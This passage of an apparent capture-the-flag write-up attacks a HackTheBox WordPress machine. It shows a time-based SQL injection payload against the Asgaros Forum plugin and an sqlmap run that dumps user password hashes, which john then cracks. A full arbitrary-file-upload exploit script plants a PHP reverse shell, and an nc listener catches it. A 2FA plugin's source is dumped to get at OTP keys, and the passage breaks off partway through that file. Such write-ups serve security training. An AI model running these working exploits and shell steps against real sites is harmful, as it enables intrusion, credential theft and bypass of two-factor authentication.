 | Location: https://phoenix.htb/wp-content/plugins/photo-gallery-builder/
 | Latest Version: 2.3
 | Last Updated: 2022-02-23T07:02:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] pie-register
 | Location: https://phoenix.htb/wp-content/plugins/pie-register/
 | Latest Version: 3.7.4.2
 | Last Updated: 2022-02-14T05:16:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] timeline-event-history
 | Location: https://phoenix.htb/wp-content/plugins/timeline-event-history/
 | Latest Version: 2.2
 | Last Updated: 2022-02-23T06:58:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.
```

 - [Asgaros Forum < 2.0.0 - Subscriber+ Blind SQL Injection](https://wpscan.com/vulnerability/35272197-c973-48ad-8405-538bfbafa172)

we first need to get the _wpnonce value:

``` bash
https://phoenix.htb/wp-admin/admin-ajax.php?action=rest-nonce
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2185.jpg)

so we can build the payload request like below:

``` bash
POST /?rest_route=/asgaros-forum/v1/reaction/1/hello HTTP/2
Host: phoenix.htb
Cookie: asgarosforum_unread_cleared=1000-01-01%2000%3A00%3A00; asgarosforum_unread_exclude=a%3A1%3A%7Bi%3A1%3Bi%3A1%3B%7D; wp-settings-time-8=1648102004; PHPSESSID=9fjjtktvasvk7ttiae2lag57bj; wordpress_logged_in_3185d858877bd1933266ec420c541bfc=luci%7C1649311604%7CDS4X13KhVrhypqTbdEQOOGSwBAYP3Sra5ZwFwAC7FCE%7C7e49b65fe7fd8b77bbeb4209856d4ac458907af59e10ff0015ab926f72d210bd; wp-settings-8=mfold%3Df
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://phoenix.htb/forum/forum/first-forum/
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 88


post_id=1 UNION SELECT 1, 1, 1, 1, 1,2,3,4,5,sleep(2) FROM dual -- g&_wpnonce=3354d7889a
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2186.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2187.jpg)

confirmed this is a time based sql injection

#### Foothold

We confirm this works via manual injection. I’ll use SQLMAP to further this:

``` bash
sqlmap --url https://phoenix.htb/forum/?subscribe_topic=1 --level 3 --risk 3 --batch
```

``` bash
Database: wordpress
[40 tables]
+-------------------------------------+
| wp_commentmeta                      |
| wp_comments                         |
| wp_forum_ads                        |
| wp_forum_forums                     |
| wp_forum_polls                      |
| wp_forum_polls_options              |
| wp_forum_polls_votes                |
| wp_forum_posts                      |
| wp_forum_reactions                  |
| wp_forum_reports                    |
| wp_forum_topics                     |
| wp_links                            |
| wp_mo2f_network_blocked_ips         |
| wp_mo2f_network_email_sent_audit    |
| wp_mo2f_network_transactions        |
| wp_mo2f_network_whitelisted_ips     |
| wp_mo2f_user_details                |
| wp_mo2f_user_login_info             |
| wp_options                          |
| wp_pieregister_code                 |
| wp_pieregister_custom_user_roles    |
| wp_pieregister_invite_code_emails   |
| wp_pieregister_lockdowns            |
| wp_pieregister_redirect_settings    |
| wp_postmeta                         |
| wp_posts                            |
| wp_term_relationships               |
| wp_term_taxonomy                    |
| wp_termmeta                         |
| wp_terms                            |
| wp_usermeta                         |
| wp_users                            |
| wp_wpns_attack_logs                 |
| wp_wpns_backup_report               |
| wp_wpns_files_scan                  |
| wp_wpns_ip_rate_details             |
| wp_wpns_malware_hash_file           |
| wp_wpns_malware_scan_report         |
| wp_wpns_malware_scan_report_details |
| wp_wpns_malware_skip_files          |
+-------------------------------------+
```

The immediately useful ones are wp_user that we can dump:

``` bash
+----+------------+------------------------------------+---------------+------------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email             | user_url            | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | Phoenix    | $P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc. | phoenix       | phoenix@phoenix.htb    | https://phoenix.htb | 2021-11-10 15:04:57 |                                               |           0 | Phoenix      |
|  3 | john       | $P$B8eBH6QfVODeb/gYCSJRvm9MyRv7xz. | john          | john@domain.htb        |                     | 2021-11-12 13:18:52 | 1637475452:$P$Byf8G.iNgy4e7VvrqKEAA7G/eQ9KtZ. |           0 | john         |
|  5 | Jsmith     | $P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G. | jsmith        | john.smith@phoenix.htb |                     | 2021-11-21 06:09:43 |                                               |           0 | John Smith   |
|  6 | Jane       | $P$BJCq26vxPmaQtAthFcnyNv1322qxD91 | jane          | jane@phoenix.htb       |                     | 2021-11-21 06:10:43 | 1637475043:$P$BMJkE2fGOJndBWkaqjsnK1OYpNn2aA. |           0 | Jane Logan   |
|  7 | Jack       | $P$BzalVhBkVN.6ii8y/nbv3CTLbC0E9e. | jack          | jack@phoenix.htb       |                     | 2021-11-21 06:11:27 | 1637475087:$P$B3xIrY8QcD0jSicmD4B/iOltw1jplE/ |           0 | Jack Thomson |
+----+------------+------------------------------------+---------------+------------------------+---------------------+---------------------+-----------------------------------------------+-------------+--------------+
```

This didn’t get me as far as I’d like. We can crack pheonix’s password to phoenixthefirebird14 using john and rockyou.txt. We can try the file upload exploit:

``` bash
┌──(root💀kali)-[~/hackthebox/machine/phoenix]
└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt                                                        
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 512/512 AVX512BW 16x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:08 1.04% (ETA: 11:01:01) 0g/s 21956p/s 109782c/s 109782C/s 840924..211126
phoenixthefirebird14 (?)     
superphoenix     (?)     
password@1234    (?)     
3g 0:00:06:25 DONE (2022-03-23 10:54) 0.007786g/s 37224p/s 99497c/s 99497C/s !!!@@@!!!..*7¡Vamos!
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

 - [Exploit Title: Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload](https://www.exploit-db.com/raw/50287)

This is pretty easy to use however we run into an SSL cert issue:

We need to change up the request to ignore SSL verification (on both requests):

``` bash
# Exploit Title: Wordpress Plugin Download From Files 1.48 - Arbitrary File Upload
# Google Dork: inurl:/wp-content/plugins/download-from-files
# Date: 10/09/2021
# Exploit Author: spacehen
# Vendor Homepage: https://wordpress.org/plugins/download-from-files/
# Version: <= 1.48
# Tested on: Ubuntu 20.04.1 LTS (x86)

import os.path
from os import path
import json
import requests
import sys

def print_banner():
	print("Download From Files <= 1.48 - Arbitrary File Upload")
	print("Author -> spacehen (www.github.com/spacehen)")

def print_usage():
	print("Usage: python3 exploit.py [target url] [php file]")
	print("Ex: python3 exploit.py https://example.com ./shell.(php4/phtml)")

def vuln_check(uri):
	response = requests.get(uri, verify=False)
	raw = response.text

	if ("Sikeres" in raw):
		return True;
	else:
		return False;

def main():

	print_banner()
	if(len(sys.argv) != 3):
		print_usage();
		sys.exit(1);

	base = sys.argv[1]
	file_path = sys.argv[2]

	ajax_action = 'download_from_files_617_fileupload'
	admin = '/wp-admin/admin-ajax.php';

	uri = base + admin + '?action=' + ajax_action ;
	check = vuln_check(uri);

	if(check == False):
		print("(*) Target not vulnerable!");
		sys.exit(1)

	if( path.isfile(file_path) == False):
		print("(*) Invalid file!")
		sys.exit(1)

	files = {'files[]' : open(file_path)}
	data = {
	"allowExt" : "php4,phtml",
	"filesName" : "files",
    "maxSize" : "1000",
    "uploadDir" : "."
	}
	print("Uploading Shell...");
	response = requests.post(uri, files=files, data=data, verify=False)
	file_name = path.basename(file_path)
	if("ok" in response.text):
		print("Shell Uploaded!")
		if(base[-1] != '/'):
			base += '/'
		print(base + "wp-admin/" + file_name);
	else:
		print("Shell Upload Failed")
		sys.exit(1)

main()
```

We can retry using a php reverse shell, Make sure this is saved with a .phtml exploit:

 - [php-reverse-shell.php](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

``` bash
┌──(root💀kali)-[~/hackthebox/machine/phoenix]
└─# python3 exploit.py https://phoenix.htb/ ./shell.phtml
Download From Files <= 1.48 - Arbitrary File Upload
Author -> spacehen (www.github.com/spacehen)
/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host 'phoenix.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn(
Uploading Shell...
/usr/local/lib/python3.9/dist-packages/urllib3/connectionpool.py:1013: InsecureRequestWarning: Unverified HTTPS request is being made to host 'phoenix.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  warnings.warn(
Shell Uploaded!
https://phoenix.htb/wp-admin/shell.phtml
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/phoenix]
└─# nc -lvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.149.
Ncat: Connection from 10.10.11.149:34844.
Linux phoenix 5.4.0-96-generic #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 06:28:24 up 18:25,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(wp_user) gid=1001(wp_user) groups=1001(wp_user)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
wp_user@phoenix:/$ ^Z
[1]+  Stopped                 nc -lvp 1234

┌──(root💀kali)-[~/hackthebox/machine/phoenix]
└─# stty raw -echo

┌──(root💀kali)-[~/hackthebox/machine/phoenix]
nc -lvp 1234
            reset
reset: unknown terminal type unknown
Terminal type? screen
wp_user@phoenix:/$ id
uid=1001(wp_user) gid=1001(wp_user) groups=1001(wp_user)
wp_user@phoenix:/$ whoami
wp_user
```

#### GET OPT KEY

we find there is a 2FA auth in /wp-admin login page, we try to figure it out how to bypass it, or just get the OTP key:

and we found encrypt and decrypt functions from the source of that miniorange plugin at handler/twofa/two_fa_utility.php

``` bash
wp_user@phoenix:~/wordpress$ cat /opt/wordpress/wp-content/plugins/miniorange-2-factor-authentication/handler/twofa/two_fa_utility.php
<?php
/** miniOrange enables user to log in through mobile authentication as an additional layer of security over password.
 * Copyright (C) 2015  miniOrange
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 * @package        miniOrange OAuth
 * @license        http://www.gnu.org/copyleft/gpl.html GNU/GPL, see LICENSE.php
 */

/**
 * This library is miniOrange Authentication Service.
 * Contains Request Calls to Customer service.
 **/
class MO2f_Utility {

        public static function get_hidden_phone( $phone ) {
                $hidden_phone = 'xxxxxxx' . substr( $phone, strlen( $phone ) - 3 );
                return $hidden_phone;
        }

        public static function mo2f_check_empty_or_null( $value ) {
                if ( ! isset( $value ) || $value == '' ) {
                        return true;
                }
                return false;
        }

        public static function is_curl_installed() {
                if ( in_array( 'curl', get_loaded_extensions() ) ) {
                        return 1;
                } else {
                        return 0;
                }
        }

        public static function get_all_plugins_installed() {
                $all_plugins = get_plugins();
                $plugins = array();
                $form = "";
                $plugins["None"] = "None";
                foreach ($all_plugins as $plugin_name=>$plugin_details){
                        $plugins[$plugin_name] = $plugin_details["Name"];
                }
                unset($plugins['miniorange-2-factor-authentication/miniorange_2_factor_settings.php']);
                $form .= '<div style="padding:5px;margin-left:4%;font-size:13px;background-color: #a3e8c2">Please select the plugin<br>
                        <select name="plugin_selected">';
                foreach($plugins as $identifier=>$name) {
                        $form .= '<option value="' . $identifier . '">' .  $name . '</option>' ;
                }
                $form .= '</select></div>';
                return $form;
        }

        public static function mo2f_check_number_length( $token ) {
                if ( is_numeric( $token ) ) {
                        if ( strlen( $token ) >= 4 && strlen( $token ) <= 8 ) {
                                return true;
                        } else {
                                return false;
                        }
                } else {
                        return false;
                }
        }

        public static function mo2f_get_hidden_email( $email ) {
                if ( ! isset( $email ) || trim( $email ) === '' ) {
                        return "";
                }
                $emailsize    = strlen( $email );
                $partialemail = substr( $email, 0, 1 );
                $temp         = strrpos( $email, "@" );
                $endemail     = substr( $email, $temp - 1, $emailsize );
                for ( $i = 1; $i < $temp; $i ++ ) {
                        $partialemail = $partialemail . 'x';
                }
                $hiddenemail = $partialemail . $endemail;
                return $hiddenemail;
        }

        public static function check_if_email_is_already_registered( $email ) {
                global $Mo2fdbQueries;
                $users = get_users( array() );
                foreach ( $users as $user ) {
                        $user_email = $Mo2fdbQueries->get_user_detail( 'mo2f_user_email', $user->ID );
                        if ( $user_email == $email ) {
                                return true;
                        }
                }

                return false;
        }

        public static function check_if_request_is_from_mobile_device( $useragent ) {
                if ( preg_match( '/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i', $useragent ) || preg_match( '/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr( $useragent, 0, 4 ) ) ) {
                        return true;
                } else {
                        return false;
                }
        }


        public static function set_user_values(  $user_session_id, $variable, $value){
                global $Mo2fdbQueries;
                $key = get_option( 'mo2f_encryption_key' );
                $data_option=NULL;

                if(empty($data_option)){

                        //setting session
                        $_SESSION[$variable] = $value;

                        // setting cookie values
                        if(is_array($value)){
                                if($variable == 'mo_2_factor_kba_questions'){
                                        MO2f_Utility::mo2f_set_cookie_values( 'kba_question1', $value[0]['question']);
                                        MO2f_Utility::mo2f_set_cookie_values( 'kba_question2', $value[1]['question'] );
                                }else if($variable == 'mo2f_rba_status'){
                                        MO2f_Utility::mo2f_set_cookie_values( 'mo2f_rba_status_status', $value["status"] );
                                        MO2f_Utility::mo2f_set_cookie_values( 'mo2f_rba_status_sessionUuid', $value["sessionUuid"] );
                                        MO2f_Utility::mo2f_set_cookie_values( 'mo2f_rba_status_decision_flag', $value["decision_flag"] );
                                }
                        }else{
                                MO2f_Utility::mo2f_set_cookie_values( $variable, $value);
                        }

                        // setting values in database
                        $user_session_id = MO2f_Utility::decrypt_data( $user_session_id, $key );
                        if ( is_array( $value ) ) {
                                $string_value = serialize( $value );
                                $Mo2fdbQueries->save_user_login_details( $user_session_id, array( $variable => $string_value ) );
                        } else {
                                $Mo2fdbQueries->save_user_login_details( $user_session_id, array( $variable => $value ) );
                        }
                } else if (!empty($data_option) && $data_option=="sessions"){

                        $_SESSION[$variable] = $value;

                }else if (!empty($data_option) && $data_option=="cookies"){

                        if(is_array($value)){
                                if($variable == 'mo_2_factor_kba_questions'){
                                        MO2f_Utility::mo2f_set_cookie_values( 'kba_question1', $value[0] );
                                        MO2f_Utility::mo2f_set_cookie_values( 'kba_question2', $value[1] );
                                }else if($variable == 'mo2f_rba_status'){
                                        MO2f_Utility::mo2f_set_cookie_values( 'mo2f_rba_status_status', $value["status"] );
                                        MO2f_Utility::mo2f_set_cookie_values( 'mo2f_rba_status_sessionUuid', $value["sessionUuid"] );
                                        MO2f_Utility::mo2f_set_cookie_values( 'mo2f_rba_status_decision_flag', $value["decision_flag"] );
                                }
                        }else{
                                MO2f_Utility::mo2f_set_cookie_values( $variable, $value);
                        }
                } else if (!empty($data_option) && $data_option=="tables"){
                        $user_session_id = MO2f_Utility::decrypt_data( $user_session_id, $key );
                        if ( is_array( $value ) ) {
                                $string_value = serialize( $value );
                                $Mo2fdbQueries->save_user_login_details( $user_session_id, array( $variable => $string_value ) );
                        } else {
                                $Mo2fdbQueries->save_user_login_details( $user_session_id, array( $variable => $value ) );
                        }
                }
        }
        public static function get_client_ipaddress(){

                $ip = null;
                if (!empty($_SERVER['HTTP_CLIENT_IP'])) {

                        $ip = $_SERVER['HTTP_CLIENT_IP'];

                } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {

                        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

                } else {
                        $ip = $_SERVER['REMOTE_ADDR'];
                }
                return $ip;
        }
        /*

        Returns Random string with length provided in parameter.

        */

        /**
         * @param string $data - crypt response from Sagepay
         *
         * @return string
         */
        public static function decrypt_data( $data, $key ) {
                $c = base64_decode($data);
                $ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
                $iv = substr($c, 0, $ivlen);
                $hmac = substr($c, $ivlen, $sha2len=32);
                $ciphertext_raw = substr($c, $ivlen+$sha2len);
                $original_plaintext = openssl_decrypt($ciphertext_raw, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
                $calcmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
                $decrypted_text = '';
                if(is_string($hmac) and is_string($calcmac))
                {
                        if (hash_equals($hmac, $calcmac))//PHP 5.6+ timing attack safe comparison
                        {
                                $decrypted_text=$original_plaintext;
                        }
                }

                return $decrypted_text;
        }

        public static function random_str( $length, $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' ) {
                $randomString     = '';
                $charactersLength = strlen( $keyspace );
                $keyspace         = $keyspace . microtime( true );
                $keyspace         = str_shuffle( $keyspace );
                for ( $i = 0; $i < $length; $i ++ ) {
                        $randomString .= $keyspace[ rand( 0, $charactersLength - 1 ) ];
                }

                return $randomString;

        }

        public static function mo2f_set_transient( $session_id, $key, $value, $expiration = 300 ) {
                set_transient($session_id.$key, $value, $expiration);
                $transient_array = get_site_option($session_id);
                $transient_array[$key] = $value;
                update_site_option($session_id, $transient_array);
                MO2f_Utility::mo2f_set_session_value($session_id, $transient_array);
                if(is_array($value))
                $value = json_encode($value) ;
            
                MO2f_Utility::mo2f_set_cookie_values(base64_encode($session_id),$value);
            
  }
        public static function mo2f_get_transient( $session_id, $key) {
                   MO2f_Utility::mo2f_start_session();

        if(isset($_SESSION[$session_id])){
                $transient_array = $_SESSION[$session_id];
                $transient_value = isset($transient_array[$key]) ? $transient_array[$key] : null;
                return $transient_value;
        }else if(isset($_COOKIE[base64_decode($session_id)])){
                $transient_value = MO2f_Utility::mo2f_get_cookie_values(base64_decode($session_id));
                return $transient_value;
        }else{
                $transient_value = get_transient($session_id.$key);
                if(!$transient_value){
                                $transient_array = get_site_option($session_id);
                                $transient_value = isset($transient_array[$key]) ? $transient_array[$key] : null;
                        }
                return $transient_value;
        }


        }
    public static function mo2f_set_session_value($session_id, $transient_array){
                 MO2f_Utility::mo2f_start_session();
                    $_SESSION[ $session_id ] = $transient_array ;
    }

    public static function mo2f_start_session() {
                if ( ! session_id() || session_id() == '' || ! isset( $_SESSION ) ) {
                        $session_path = ini_get('session.save_path');
                        if( is_writable($session_path) && is_readable($session_path) && !headers_sent() ) {
                           if(session_status() != PHP_SESSION_DISABLED )
                                   session_start();
                        }
                }
        }
        /**
         * The function returns the session variables, and if not, retrieves the cookie values set in case the right permissions are not aassigned for the sessions folder in the server.
         *
         * @param string $variable - the session or cookie variable name
         * @param string $session_id - the session id of the user
         *
         * @return string
         */
        public static function mo2f_retrieve_user_temp_values( $variable, $session_id = null ) {
                global $Mo2fdbQueries;
                $data_option=NULL;
                if(empty($data_option)){
                        if ( isset( $_SESSION[ $variable ] ) && ! empty( $_SESSION[ $variable ] ) ) {
                                //update_option('mo2f_data_storage',"sessions");
                                return $_SESSION[ $variable ];
                        } else {
                                $key        = get_option( 'mo2f_encryption_key' );
                                $cookie_value = false;
                                if ( $variable == 'mo2f_rba_status' ) {
                                        if ( isset( $_COOKIE['mo2f_rba_status_status'] ) && ! empty( $_COOKIE['mo2f_rba_status_status'] ) ) {
                                                $mo2f_rba_status_status        = MO2f_Utility::mo2f_get_cookie_values( 'mo2f_rba_status_status' );
                                                $mo2f_rba_status_sessionUuid   = MO2f_Utility::mo2f_get_cookie_values( 'mo2f_rba_status_sessionUuid' );
                                                $mo2f_rba_status_decision_flag = MO2f_Utility::mo2f_get_cookie_values( 'mo2f_rba_status_decision_flag' );
                                                $cookie_value = array(
                                                        "status"        => $mo2f_rba_status_status,
                                                        "sessionUuid"   => $mo2f_rba_status_sessionUuid,
                                                        "decision_flag" => $mo2f_rba_status_decision_flag
                                                );
                                        }
                                } else if ( $variable == 'mo_2_factor_kba_questions' ) {
                                        if ( isset( $_COOKIE['kba_question1'] ) && ! empty( $_COOKIE['kba_question1'] ) ) {

                                                $kba_question1['question'] = MO2f_Utility::mo2f_get_cookie_values( 'kba_question1' );
                                                $kba_question2['question'] = MO2f_Utility::mo2f_get_cookie_values( 'kba_question2' );
                                                $cookie_value = array( $kba_question1, $kba_question2 );
                                        }
                                } else {
                                        $cookie_value = MO2f_Utility::mo2f_get_cookie_values( $variable );
                                }
                                if($cookie_value){
                                        return $cookie_value;
                                } else {
                                        $session_id = MO2f_Utility::decrypt_data( $session_id, $key );
                                        $db_value = $Mo2fdbQueries->get_user_login_details( $variable, $session_id );
                                        if ( in_array( $variable, array( "mo2f_rba_status", "mo_2_factor_kba_questions" ) ) ) {
                                                $db_value = unserialize( $db_value );
                                        }
                                        return $db_value;
                                }
                        }
                }else if (!empty($data_option) && $data_option=="sessions"){
                        if ( isset( $_SESSION[ $variable ] ) && ! empty( $_SESSION[ $variable ] ) ) {
                                return $_SESSION[ $variable ];
                        }
                }else if (!empty($data_option) && $data_option=="cookies"){
                        $key        = get_option( 'mo2f_encryption_key' );
                        $cookie_value = false;

                        if ( $variable == 'mo2f_rba_status' ) {
                                if ( isset( $_COOKIE['mo2f_rba_status_status'] ) && ! empty( $_COOKIE['mo2f_rba_status_status'] ) ) {
                                        $mo2f_rba_status_status        = MO2f_Utility::mo2f_get_cookie_values( 'mo2f_rba_status_status' );
                                        $mo2f_rba_status_sessionUuid   = MO2f_Utility::mo2f_get_cookie_values( 'mo2f_rba_status_sessionUuid' );
                                        $mo2f_rba_status_decision_flag = MO2f_Utility::mo2f_get_cookie_values( 'mo2f_rba_status_decision_flag' );

                                        $cookie_value = array(
                                                "status"        => $mo2f_rba_status_status,
                                                "sessionUuid"   => $mo2f_rba_status_sessionUuid,
                                                "decision_flag" => $mo2f_rba_status_decision_flag
                                        );
                                }

                        } else if ( $variable == 'mo_2_factor_kba_questions' ) {

                                if ( isset( $_COOKIE['kba_question1'] ) && ! empty( $_COOKIE['kba_question1'] ) ) {
                                        $kba_question1 = MO2f_Utility::mo2f_get_cookie_values( 'kba_question1' );
                                        $kba_question2 = MO2f_Utility::mo2f_get_cookie_values( 'kba_question2' );


                                        $cookie_value = array( $kba_question1, $kba_question2 );
                                }

                        } else {
                                $cookie_value = MO2f_Utility::mo2f_get_cookie_values( $variable );
                        }

                        if($cookie_value){
                                return $cookie_value;
                        }
                }else if (!empty($data_option) && $data_option=="tables"){
                        $key = get_option( 'mo2f_encryption_key' );
                        $session_id = MO2f_Utility::decrypt_data( $session_id, $key );
                        $db_value = $Mo2fdbQueries->get_user_login_details( $variable, $session_id );
                        if ( in_array( $variable, array( "mo2f_rba_status", "mo_2_factor_kba_questions" ) ) ) {
                                $db_value = unserialize( $db_value );
                        }
                        return $db_value;
                }
        }

        /**
         * The function gets the cookie value after decoding and decryption.
         *
         * @param string $cookiename - the cookie name
         *
         * @return string
         */
        public static function mo2f_get_cookie_values( $cookiename ) {

                $key        = get_option( 'mo2f_encryption_key' );
                if ( isset( $_COOKIE[ $cookiename ] ) ) {
                        $decrypted_data = MO2f_Utility::decrypt_data( base64_decode( $_COOKIE[ $cookiename ] ), $key );

                        if(MO2f_Utility::isJSON($decrypted_data))
                         $decrypted_data = json_decode($decrypted_data);

                        if ( $decrypted_data ) {
                                $decrypted_data_array = explode( '&', $decrypted_data );

                                $cookie_value         = $decrypted_data_array[0];
                                if(sizeof($decrypted_data_array) == 2 ){
                                        $cookie_creation_time = new DateTime( $decrypted_data_array[1] );
                                }else{
                                        $cookie_creation_time = new DateTime( array_pop($decrypted_data_array) );
                                        $cookie_value = implode('&', $decrypted_data_array);
                                }
                                $current_time         = new DateTime( 'now' );

                                $interval = $cookie_creation_time->diff( $current_time );
                                $minutes  = $interval->format( '%i' );

                                $is_cookie_valid = $minutes <= 5 ? true : false;

                                return $is_cookie_valid ? $cookie_value : false;

                        } else {
                                return false;
                        }
                } else {
                        return false;
                }
        }
    
   public static function isJSON($string){
           return is_string($string) && is_array(json_decode($string, true)) ? true : false;
        }
        /**
         * The function sets the cookie value after encryption and encoding.
         *
         * @param string $cookiename - the cookie name
         * @param string $cookievalue - the cookie value to be set
         *
         * @return string
         */
        public static function  mo2f_set_cookie_values( $cookiename, $cookievalue ) {

                $key        = get_option( 'mo2f_encryption_key' );

                $current_time = new DateTime( 'now' );
                $current_time = $current_time->format( 'Y-m-d H:i:sP' );
                $cookievalue  = $cookievalue . '&' . $current_time;

                $cookievalue_encrypted = MO2f_Utility::encrypt_data( $cookievalue, $key );
                // setcookie( $cookiename, base64_encode( $cookievalue_encrypted ) );
                // setcookie( $cookiename, base64_encode( $cookievalue_encrypted ),NULL,NULL,NULL,NULL, TRUE );
                $_COOKIE[$cookiename] = base64_encode( $cookievalue_encrypted );
        }

        /**
         * @param string $data - the key=value pairs separated with &
         *
         * @return string
         */
        public static function encrypt_data( $data, $key ) {
                $plaintext = $data;
                $ivlen = openssl_cipher_iv_length($cipher="AES-128-CBC");
                $iv = openssl_random_pseudo_bytes($ivlen);
                $ciphertext_raw = openssl_encrypt($plaintext, $cipher, $key, $options=OPENSSL_RAW_DATA, $iv);
                $hmac = hash_hmac('sha256', $ciphertext_raw, $key, $as_binary=true);
                $ciphertext = base64_encode( $iv.$hmac.$ciphertext_raw );
                return $ciphertext;
        }

        /**
